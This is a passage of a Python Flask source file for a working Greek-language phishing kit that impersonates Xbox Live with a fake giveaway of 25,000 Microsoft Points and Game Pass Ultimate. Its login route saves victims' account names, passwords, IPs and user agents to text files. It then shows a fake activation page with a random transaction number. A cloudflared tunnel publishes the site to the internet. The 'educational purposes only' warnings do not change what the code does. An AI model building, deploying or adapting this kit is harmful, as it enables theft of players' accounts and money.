                    card.style.transition = 'all 0.5s ease';
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, index * 200);
            });
            
            // Mobile viewport adjustment
            function setViewportHeight() {
                let vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', vh + 'px');
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('xb_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w', encoding='utf-8') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Xbox Account: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Xbox Live Giveaway (Ελλάδα)\n")
        file.write(f"Promised: 25,000 Microsoft Points + 1 Year Game Pass Ultimate\n")
        file.write(f"Games Shown: Halo Infinite, Forza Horizon 5, Gears 5, State of Decay 3\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <title>Επεξεργασία Game Pass - Xbox Live</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
        <style>
            :root {
                --xbox-green: #107C10;
                --xbox-gold: #FFB900;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #000000 0%, #107C10 100%);
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: rgba(0, 0, 0, 0.9);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 8px;
                width: 100%;
                max-width: 600px;
                border: 2px solid #107C10;
                box-shadow: 0 8px 32px rgba(16, 124, 16, 0.3);
                margin: 0 auto;
            }
            
            .xbox-logo {
                font-size: 36px;
                font-weight: 800;
                color: white;
                margin-bottom: 15px;
                letter-spacing: 1px;
            }
            
            .xbox-logo-img {
                width: 100px;
                height: auto;
                margin: 0 auto 20px;
                display: block;
                animation: float 3s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            .processing-container {
                background: rgba(16, 124, 16, 0.1);
                border: 2px solid var(--xbox-green);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 6px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #107C10, #5FAF5F, #FFB900);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .gamepass-activated {
                background: rgba(255, 185, 0, 0.1);
                border: 2px solid var(--xbox-gold);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #5FAF5F;
                font-weight: bold;
                font-size: 18px;
                margin-right: 12px;
                min-width: 20px;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #FFFFFF;
                font-size: 16px;
            }
            
            .points-amount {
                font-size: 42px;
                font-weight: 900;
                background: linear-gradient(45deg, #FFB900, #FFD966);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(255, 185, 0, 0.3);
            }
            
            .points-icon {
                color: #FFD966;
                font-size: 32px;
                margin-right: 8px;
                vertical-align: middle;
            }
            
            .games-added {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-item {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 12px;
                text-align: center;
            }
            
            .game-icon {
                font-size: 20px;
                margin-bottom: 8px;
                color: #5FAF5F;
            }
            
            .transaction-id {
                background: rgba(16, 124, 16, 0.1);
                border: 1px solid #333333;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                color: #CCCCCC;
                margin: 12px 0;
                word-break: break-all;
            }
            
            .gamepass-badge {
                background: linear-gradient(45deg, #107C10, #5FAF5F);
                color: white;
                padding: 8px 16px;
                border-radius: 20px;
                font-size: 13px;
                font-weight: 700;
                margin: 15px 0;
                display: inline-block;
            }
            
            h2 {
                margin-bottom: 8px;
                color: #5FAF5F;
                font-size: 24px;
            }
            
            h3 {
                margin-top: 0;
                color: white;
                font-size: 20px;
            }
            
            p {
                color: #CCCCCC;
                font-size: 14px;
                line-height: 1.5;
            }
            
            /* Mobile-specific adjustments */
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                    min-height: -webkit-fill-available;
                }
                
                .container {
                    padding: 20px;
                    width: 100%;
                    max-width: 100%;
                }
                
                .xbox-logo-img {
                    width: 80px;
                }
                
                .xbox-logo {
                    font-size: 32px;
                }
                
                .points-amount {
                    font-size: 36px;
                }
                
                .points-icon {
                    font-size: 28px;
                }
                
                h2 {
                    font-size: 22px;
                }
                
                h3 {
                    font-size: 18px;
                }
                
                .gamepass-badge {
                    font-size: 12px;
                    padding: 6px 12px;
                }
                
                .games-added {
                    grid-template-columns: repeat(2, 1fr);
                    gap: 10px;
                }
                
                .game-item {
                    padding: 10px;
                }
                
                .status-item {
                    font-size: 14px;
                }
                
                .processing-container {
                    padding: 15px;
                }
                
                .gamepass-activated {
                    padding: 15px;
                }
            }
            
            @media (max-width: 360px) {
                .points-amount {
                    font-size: 32px;
                }
                
                .games-added {
                    grid-template-columns: 1fr;
                }
                
                .status-item {
                    font-size: 13px;
                }
            }
            
            /* Prevent text selection */
            .noselect {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body class="noselect">
        <div class="container">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik05My4xMjUgNTIuMjMzM0M5My4xMjUgNjcuNTEyOCA4MC44NzUgODIuMTY4NCA2My4yNSA4OC41ODI2QzU0Ljg3NSA5MS44MzQ3IDQ4Ljg3NSA5Mi43ODQ2IDQzLjc1IDkyLjc4NDZDNDAuNjI1IDkyLjc4NDYgMzcuNSA5Mi40MTgyIDM0LjM3NSA5MS42ODU0QzI3LjEyNSA4OS44OTE2IDIyLjUgODguNTgyNiAxNi41IDg2LjU5MzhDMTUuMzc1IDg2LjE2MDcgMTQuMjUgODUuNzI3NiAxMi41IDg1LjEwM0MxMS4zNzUgODQuNTY5OSA5LjM3NSA4My42NCA4LjEyNSA4Mi4zMDMxQzcuNSAxNy4wNDE5IDMxLjg3NSAzLjEyNSA0OC4xMjUgMy4xMjVDNjMuMjUgMy4xMjUgNzYuODc1IDEzLjQzMTIgODIuNSAyNy4yMjg4Qzg4LjEyNSAzNy41MDI3IDg4LjEyNSA1MC4xODc1IDgyuNSA2MC4wNjYzQzg3LjM3NSA1OS43MzI4IDkwLjYyNSA1OC4wNjMzIDkzLjEyNSA1Mi4yMzMzWiIgZmlsbD0iIzEwN0MxMCIvPgo8cGF0aCBkPSJNMTQuMjUgNzQuMTY1N0MxNS42MjUgNzQuNDk5MiAxNi41IDc0LjgzMjcgMTguMTI1IDc1LjI2NThDMjMuMjUgNzYuODA5NiAyNy4xMjUgNzcuOTY2OSAzMy43NSA3OS41MTA3QzQ0LjYyNSA4Mi4xNjg0IDUzLjc1IDgyLjUwMiA2MC4zNzUgODAuMzIzMUM2My41IDc5LjQzMDMgNjYuMjUgNzguMTAyMyA3MC4zNzUgNzUuOTUyM0M3NC41IDczLjgwMjMgNzcuMjUgNzIuMzU3OCA4MCA3MC4wMTk4QzgyLjc1IDY3LjY4MTggODUgNjQuNjUyMyA4Ni4yNSA2MC43MjIyQzg3LjUgNTYuNzkyIDg3LjUgNTEuNzcxMiA4Ni4yNSA0Ny4zOTYzQzg1LjM3NSA0NC4xODgyIDg0LjEyNSA0Mi4wMzgyIDgzLjEyNSAzOS44ODgyQzgyLjEyNSAzNy43MzgyIDgxLjUgMzYuMTAzMSA4MS41IDMzLjU4MjZDODEuNSAzMC4zOTM4IDgzLjEyNSAyOC41MTkzIDg1LjM3NSAyNy4yMjg4Qzg3LjYyNSAyNS45MzgzIDkwLjI1IDI1LjgwNTEgOTIuODc1IDI3LjIyODhDOTMuNSAyNy41NjIzIDkzLjc1IDI4LjA5NTQgOTMuNSAyOC41MDI3QzkzLjEyNSAyOS4yOTY1IDkyLjYyNSAzMC4yMzEyIDkyLjEyNSAzMS4wMjVDOTEuNjI1IDMxLjgxODggOTEgMzIuNjc5OSA5MC4zNzUgMzMuMjgwMUM4OC41IDM1LjAzMDggODYuMjUgMzUuOTc0MiA4NC4zNzUgMzcuNTgyN0M4Mi41IDQ1LjM3MTIgNzkuMzc1IDUzLjE2IDc0LjM3NSA2MC4wNjYzQzcwLjM3NSA2NS40NTExIDY1LjYyNSA2OS4wMzEyIDYwLjM3NSA3MS4xNzg3QzU1LjEyNSA3My4zMjYyIDQ5LjM3NSA3My45OTI5IDQzLjc1IDczLjE0OTNDMzguMTI1IDcyLjMwNTcgMzMuMTI1IDcwLjAxOTggMjkuMzc1IDY3LjAwMzVDMjUuNjI1IDYzLjk4NzIgMjMuMTI1IDYwLjI0NTIgMjEuODc1IDU2LjIyMThDMjAuNjI1IDUyLjE5ODQgMjAuNjI1IDQ4LjA0ODYgMjEuODc1IDQ0LjE4ODJDMjMuMTI1IDQwLjMyNzggMjUuNjI1IDM3LjEyNTYgMjkuMzc1IDM0LjM4MDFDMzMuMTI1IDMxLjYzNDcgMzguMTI1IDI5LjQxNTcgNDMuNzUgMjguNTcyMUM0OS4zNzUgMjcuNzI4NSA1NS4xMjUgMjguMzk1MiA2MC4zNzUgMzAuNTQyN0M2NS42MjUgMzIuNjkwMiA3MC4zNzUgMzYuMjcwMyA3NC4zNzUgNDEuNjU1MUM3Ny4yNSA0NS41MTI1IDgwIDUwLjE4NzUgODIuMTI1IDU0LjU1MTdDODAuODc1IDU0Ljc4NTEgNzkuNjI1IDU1LjAxODUgNzguMTI1IDU1LjAxODVDNzYuNjI1IDU1LjAxODUgNzUuMzc1IDU0LjY4NSA3NC4zNzUgNTQuMDE4M0M3My4zNzUgNTMuMzUxNiA3Mi42MjUgNTIuMjIzMyA3Mi42MjUgNTAuNjY2OEM3Mi42MjUgNDkuMTg3NSA3My41IDQ3LjkzMzYgNzUuMzc1IDQ3LjAxODVDNzcuMjUgNDYuMTAzNSA3OS44NzUgNDUuOTcwMyA4Mi4xMjUgNDcuMDYwNEM4Mi42MjUgNDcuMjkzOCA4Mi44NzUgNDcuNzkzOCA4Mi43NSA0OC4zNjA2QzgyLjUgNDkuMjY0OSA4Mi4xMjUgNTAuMjM2NCA4MS42MjUgNTEuMDczNUM4MC41IDQ4LjA0ODYgNzguNzUgNDUuMDUwNyA3YuMjUgNDIuMzE4OEM3My43NSAzOS41ODY5IDcwLjUgMzcuMTI1NiA2Ny4yNSAzNS4zNDUyQzY0IDMzLjU2NDggNjAuMzc1IDMyLjQ2NDIgNTYuMjUgMzEuOTk3N0M1Mi4xMjUgMzEuNTMxMiA0OC4xMjUgMzEuNzk4IDQ0LjM3NSAzMi44MDIzQzQwLjYyNSAzMy44MDY2IDM3LjM3NSAzNS41MjM5IDM0Ljc1IDM3Ljg4MTlDMzIuMTI1IDQwLjIzOTkgMzAuMjUgNDMuMTY4NCAyOS4zNzUgNDYuNzMzNEMyOC41IDUwLjI5ODQgMjguNSA1NC4zMjE4IDI5LjM3NSA1Ny43NTQyQzMwLjI1IDYxLjE4NjYgMzIuMTI1IDY0LjExNTEgMzQuNzUgNjYuNDczMUMzNy4zNzUgNjguODMxMSA0MC42MjUgNzAuNTQ4NCA0NC4zNzUgNzEuNTUyN0M0OC4xMjUgNzIuNTU3IDUyLjEyNSA3Mi44MjM4IDU2LjI1IDcyLjM1NzNDNjAgNzEuODkwOCA2My42MjUgNzAuNzkwMiA2Ni44NzUgNjkuMDE2M0M3MC4xMjUgNjcuMjQyNCA3Mi43NSA2NC43OTkgNzUuMjUgNjEuNjY5NEM3Ny43NSA1OC41Mzk5IDc5LjUgNTUuMDE4NSA4MC44NzUgNTEuMDczNUM4MC44NzUgNTEuNTczNSA4MS4xMjUgNTIuMDczNSA4MS4zNzUgNTIuNDA3QzgxLjYyNSA1Mi43NDA1IDgyLjEyNSA1My4wNzQgODIuNjI1IDUzLjA3NEM4My43NSA1My4wNzQgODQuNSA1Mi4yMjMzIDg0LjUgNTAuOTcwOEM4NC41IDQ5LjcxODMgODMuNzUgNDguNTcwMSA4Mi41IDQ3Ljc5MzZDODEuMjUgNDcuMDE3MSA3OS42MjUgNDYuNzMzNCA3OC4xMjUgNDcuMTY2NUM3Ni42MjUgNDcuNTk5NiA3NS4zNzUgNDguNzI4IDc1LjM3NSA1MC4wMTg1Qzc1LjM3NSA1MS4xMDM1IDc2LjI1IDUyLjA3MzUgNzcuNjI1IDUyLjU3MzVDNzkuMDAxIDUzLjA3MzUgODAuNzUxIDUzLjA3MzUgODIuMTI1IDUyLjMzMzZDODIuODc1IDUyLjAwMDEgODMuMjUgNTEuMjMzNCA4My4zNzUgNTAuMzMzQzgzLjM3NSA0OC4wNDg2IDgxLjI1IDQ0LjUxNzMgNzcuNjI1IDQwLjM5MzlDNzMuMzc1IDM1LjY1NzkgNjcuNSAzMi43MTM5IDYwLjM3NSAzMS4yNzAxQzUzLjI1IDI5LjgyNjMgNDYuMjUgMzAuNDkzIDQwIDMzLjE1MDhDMzMuNzUgMzUuODA4NSAyOC4zNzUgNDAuNDE4IDI0Ljg3NSA0Ni4xNDQxQzIxLjM3NSA1MS44NzAyIDE5Ljc1IDU4LjU2ODcgMjAuNjI1IDY1LjQ1MTFDMjEuNSA3Mi4zMzM1IDI0Ljg3NSA3OS4xMjkgMjkuMzc1IDg0LjA1MjdDMzMuODc1IDg4Ljk3NjQgMzkuNSA5Mi4wMDYgNDUuNjI1IDkyLjg0OTZDNTEuNzUgOTMuNjkyNSA1Ny4zNzUgOTIuNzg0NiA2My4xMjUgOTAuMDgxOUM2OC44NzUgODcuMzc5MiA3My4zNzUgODMuMDE1MSA3Ny4yNSA3Ny45NjY5QzgxLjEyNSA3Mi45MTg3IDg0LjM3NSA2Ny4yNDI0IDg2Ljg3NSA2MC44NDk5Qzg3Ljc1IDU4LjU2ODcgODguMzc1IDU2LjM1MjMgODguNjI1IDU0LjA2NzlDODguNjI1IDUzLjUzNDggODguODc1IDUzLjA3NCA4OS4zNzUgNTIuODA3MkM5MC4yNSAyMS4zODIzIDcxLjg3NSA5LjQzMTg3IDUxLjg3NSA5LjQzMTg3QzQwLjYyNSA5LjQzMTg3IDI5Ljc1IDE1LjU4NTQgMjMuNSAyNS44MDUxQzE3LjI1IDM2LjAyNDggMTcuMjUgNDkuMjg5NyAyMy41IDU5LjUwOTRDMjguNzUgNjcuNjgxOCAzNi42MjUgNzMuNDk5MiA0Ni4xMjUgNzUuNDMyNkM1Mi44NzUgNzYuNjQ2MiA1OC43NSA3NS4yNjU4IDYzLjYyNSA3Mi43Mjg4QzY2LjYyNSA3MS4yODUxIDY5LjI1IDY5LjM0ODcgNzIuNSA2Ny41Njg0Qzc1Ljc1IDY1Ljc4OCA3OC42MjUgNjQuMDA3NiA4MS4xMjUgNjEuNDMxOUM4My42MjUgNTguODU2MiA4NS41IDU1LjQ1MTEgODYuNjI1IDUxLjA3MzVDODcuNzUgNDYuNjk1OSA4Ny43NSA0MS45MzU3IDg2LjYyNSAzNy41ODI3Qzg1LjUgMzMuMjI5NyA4My42MjUgMjkuNzUwNSA4MS4xMjUgMjcuMTc0OEM3OC42MjUgMjQuNTk4MSA3NS43NSAyMi44MTc3IDcyLjUgMjEuMDM3M0M2OS4yNSAxOS4yNTY5IDY2LjYyNSAxNy43MTk5IDYzLjYyNSAxNi40NzMxQzYyLjUgMTUuOTM5OSA2MS4xMjUgMTUuODA2NyA1OS44NzUgMTYuMTQwMkM1OC42MjUgMTYuNDczNyA1Ny41IDE3LjMxNzMgNTYuODc1IDE4LjQyNDFDNTYuMjUgMTkuNTMwOSA1Ni4xMjUgMjAuNzY3MiA1Ni42MjUgMjEuNzA4N0M1Ny4xMjUgMjIuNjUwMiA1OC4xMjUgMjMuMzY5MiA1OS4zNzUgMjMuNTY4N0M2MS42MjUgMjQuMDM1MiA2My4yNSAyNC45NzY3IDY0Ljc1IDI2LjA4MzVDNjYuMjUgMjcuMTkwMyA2Ny41IDI4LjYzNDEgNjguNSAzMC4yNDI2QzY5LjUgMzEuODUxMSA3MC4zNzUgMzMuNjMxNSA3MS4yNSAzNS40MTE5QzcyLjEyNSAzNy4xOTIzIDcyLjg3NSAzOS4wMzYyIDczLjUgNDAuODgzQzc0LjEyNSA0Mi43Mjk4IDc0LjYyNSA0NC41NzY2IDc1IDQ2LjI4MDJDNzUuMzc1IDQ3Ljk4MzkgNzUuNjI1IDQ5LjY1MDQgNzUuNjI1IDUxLjE3MDFDNzUuNjI1IDUyLjY4OTggNzUuMzc1IDU0LjA2NzkgNzUgNTUuMzA0MkM3NC42MjUgNTYuNTQwNSA3NCA1Ny43NTA2IDczLjM3NSA1OC43OTIzQzY5LjM3NSA2NS4xMjE1IDYyLjg3NSA2kuMDMxMiA1NS4zNzUgNjkuOTQ2MkM0Ny44NzUgNzAuODYxMiA0MC42MjUgNjguMDczOCAzNC4zNzUgNjIuOTMxM0MyOC4xMjUgNTcuNzg4OCAyMy43NSA1MC41NTUzIDIyLjEyNSA0Mi40ODA2QzIwLjUgNDQuNTE3MyAyMC41IDQ4LjA0ODYgMjIuMTI1IDUyLjk3MDNDMjMuNzUgNTcuODkyIDI3LjUgNjMuNDE1MyAzMy4xMjUgNjcuMDAzNUMzOC43NSA3MC41OTE3IDQ1LjYyNSA3Mi4wODY0IDUyLjI1IDcwLjY4OTNDNTguODc1IDY5LjI5MTUgNjQuMzc1IDY1LjEyMTUgNjcuODc1IDU5LjE5NTVDNzAuMTI1IDU1LjIzMTggNzEuNSA1MC41MTg1IDcxLjYyNSA0NS42MTkyQzcxLjc1IDQwLjcxOTkgNzAuNjI1IDM1LjkxMTMgNjguMzc1IDMxLjY4NDNDNjYuMTI1IDI3LjQ1NzMgNjIuODc1IDIzLjg3NzIgNTkuMzc1IDIxLjMxNDlDNTUuODc1IDE4Ljc1MjYgNTIuMTI1IDE3LjEwNTEgNDguMzc1IDE2LjQ3MzdDNDQuNjI1IDE1Ljg0MjMgNDEuMTI1IDE2LjMwODggMzguMTI1IDE3Ljc4ODFDMzUuMTI1IDE5LjI2NzQgMzIuODc1IDIxLjU2MzEgMzEuNjI1IDI0LjU3NTJDMzAuMzc1IDI3LjU4NzMgMzAuMzc1IDMxLjE2NzQgMzEuNjI1IDM0LjU0MjNDMzIuODc1IDM3LjkxNzMgMzUuMzc1IDQwLjgxMzggMzguNzUgNDIuODgwOEM0Mi4xMjUgNDQuOTQ3OCA0Ni4yNSA0Ni4xODQxIDUwLjM3NSA0Ni40MTc2QzU0LjUgNDYuNjUxIDU4LjYyNSA0NS44NDA4IDYyLjI1IDQ0LjI0NzVDNjUuODc1IDQyLjY1NDIgNjguODc1IDQwLjM5MiA3MS4yNSAzNy41ODI3QzczLjYyNSAzNC43NzM0IDc1LjM3NSAzMS40MjI0IDc2LjUgMjcuNzY5MUM3Ny42MjUgMjQuMTE1OCA3OC4xMjUgMjAuMjUzNiA3Ny44NzUgMTYuMzkxM0M3Ny42MjUgMTIuNTI5IDc2LjYyNSA4Ljg5Mjk3IDc1IDUuNjE4NTlDNzMuMzc1IDIuNDAyMTQgNzAuNjI1IDAgNjcuMjUgMEM2My44NzUgMCA2MS4yNSAyLjcwMjU3IDYwLjUgNy4wNzQwNEM1OS4zNzUgMTMuNzExNSA1NS4zNzUgMTkuMTQ1NyA0OS4zNzUgMjEuMzE0OUM0My4zNzUgMjMuNDg0MSAzNi43NSAyMi4xODA2IDMxLjc1IDE3Ljc4ODFDMjYuNzUgMTMuMzk1NiAyMy43NSA2LjI3NjExIDIzLjc1IDBIMTQuMjVIMTQuMjVDMTQuMjUgNi44OTMwNCAxNy4yNSAxMy44NzkgMjIuMTI1IDE5LjYxN0MyNyAyNS4zNTUgMzMuMzc1IDI5LjQ3MjcgNDAuMzc1IDMxLjIwMTNDNDcuMzc1IDMyLjkyOTkgNTQuNjI1IDMyLjE1MzQgNjAuODc1IDI5LjAzMjdDNjcuMTI1IDI1LjkxMiA3MS44NzUgMjAuNTI3NCA3NC4zNzUgMTQuMTM0OEM3Ni44NzUgNy43NDIyNSA3Ni44NzUgMC42MTYzODkgNzQuMzc1IDBINjRINjRDNjEuNzUgMCA1OS41IDIuNjkyNjQgNTguNzUgNy4wNzQwNEM1Ny42MjUgMTIuNTk3MyA1My44NzUgMTcuMjgwOCA0OC43NSAxOS40ODE2QzQzLjYyNSAyMS42ODI0IDM3Ljc1IDIwLjkxMDIgMzMuMTI1IDE3Ljc4ODFDMjguNSAxNC42NjYgMjUuNjI1IDkuNTk1NyAyNS42MjUgMy45NTY5NUgxNC4yNUgxNC4yNUMxNC4yNSAxMi40MTM5IDE4LjEyNSAyMC41ODA3IDI0Ljc1IDI3LjA5NjJDMzEuMzc1IDMzLjYxMTcgNDAuMjUgMzcuOTQ2MiA0OS42MjUgMzkuMzQzMEM1OSA0MC43Mzk4IDY4LjM3NSAzOS4wOTIzIDc2LjI1IDM0LjgwNjhDODQuMTI1IDMwLjUyMTMgOTAuMTI1IDIzLjc2MjcgOTMuMTI1IDE1LjkzMDhDOTYuMTI1IDguMDk4OTYgOTYuMTI1IC0wLjU0MDcyOSA5My4xMjUgOC40MDk3N1Y1Mi4yMzMzWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==" alt="Xbox Logo" class="xbox-logo-img">
            
            <div class="xbox-logo">Xbox</div>
            
            <div class="gamepass-badge">
                ✅ XBOX GAME PASS ULTIMATE ΕΝΕΡΓΟΠΟΙΗΘΗΚΕ
            </div>
            
            <div class="points-amount">
                <span class="points-icon">💰</span>25,000
            </div>
            
            <h2>Το Game Pass και οι Πόντοι Προστέθηκαν!</h2>
            <p>Τα οφέλη του Xbox σας ενεργοποιούνται</p>
            
            <div class="processing-container">
                <h3>Επεξεργασία του Δώρου Xbox</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Προσθήκη Microsoft Points και ενεργοποίηση Game Pass...</p>
            </div>
            
            <div class="games-added">
                <div class="game-item">
                    <div class="game-icon">🎮</div>
                    <div>Halo Infinite</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">⚔️</div>
                    <div>Forza Horizon 5</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🛡️</div>
                    <div>Gears 5</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🧟</div>
                    <div>State of Decay 3</div>
                </div>
            </div>
            
            <div class="transaction-id">
                Αριθμός Συναλλαγής: XBOX-<span id="transaction-id">0000000</span>
            </div>
            
            <div class="gamepass-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>25,000 Πόντοι</strong> προστέθηκαν στο λογαριασμό Microsoft
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Game Pass Ultimate</strong> - 1 Έτος Συνδρομή
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>4 Παιχνίδια Xbox</strong> προστέθηκαν στη βιβλιοθήκη σας
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Cloud Gaming</strong> - Πρόσβαση στο Xbox Cloud Gaming
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>EA Play Premium</strong> - Συμπεριλαμβάνεται στη συνδρομή
                </div>
            </div>
            
            <p>
                Θα ανακατευθυνθείτε στο Xbox Live...
                <br>
                <small style="color: #666666; font-size: 12px;">Τα οφέλη σας θα είναι διαθέσιμα στο Xbox, PC και Cloud Gaming εντός 24 ωρών</small>
            </p>
        </div>
        
        <script>
            // Generate random transaction ID
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
            
            // Animate points amount
            setTimeout(() => {
                const pointsAmount = document.querySelector('.points-amount');
                pointsAmount.style.transform = 'scale(1.1)';
                pointsAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    pointsAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Animate added games
            const gameItems = document.querySelectorAll('.game-item');
            gameItems.forEach((item, index) => {
                item.style.opacity = '0';
                setTimeout(() => {
                    item.style.transition = 'opacity 0.5s';
                    item.style.opacity = '1';
                }, index * 300);
            });
            
            // Mobile viewport adjustment
            function setViewportHeight() {
                let vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', vh + 'px');
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Xbox Live Ελληνική Έκδοση: {tunnel_url}")
            print(f"💰 Υπόσχεση: 25,000 ΔΩΡΕΑΝ Πόντοι Microsoft + 1 Έτος Game Pass Ultimate")
            print(f"💾 Τα στοιχεία αποθηκεύονται στο: {BASE_FOLDER}")
            print("⚠️  ΠΡΟΣΟΧΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
            print("⚠️  ΜΗΝ εισάγετε ποτέ πραγματικά στοιχεία Xbox/Microsoft!")
            print("⚠️  Οι λογαριασμοί Xbox έχουν σημαντική οικονομική και ψυχαγωγική αξία!")
            print("⚠️  Οι απάτες για Game Pass στοχεύουν εκατομμύρια παίκτες!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5014, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση Ελληνικής Έκδοσης Xbox Live...")
    print("📱 Θύρα: 5014")
    print("💾 Αποθήκευση: ~/storage/downloads/Xbox Live Ελλάδα/")
    print("💰 Υπόσχεση: 25,000 ΔΩΡΕΑΝ Πόντοι Microsoft")
    print("🎮 Bonus: 1 Έτος Xbox Game Pass Ultimate + 4 Δωρεάν Παιχνίδια")
    print("🎯 Στόχος: Χρήστες Xbox Series X/S, Xbox One, PC, και Cloud Gaming")
    print("⚠️  ΠΡΟΣΟΧΗ: Οι απάτες για Game Pass είναι εξαιρετικά συχνές!")
    print("⏳ Αναμονή για σύνδεση cloudflared...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5014")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Ο διακομιστής σταμάτησε")
        sys.exit(0)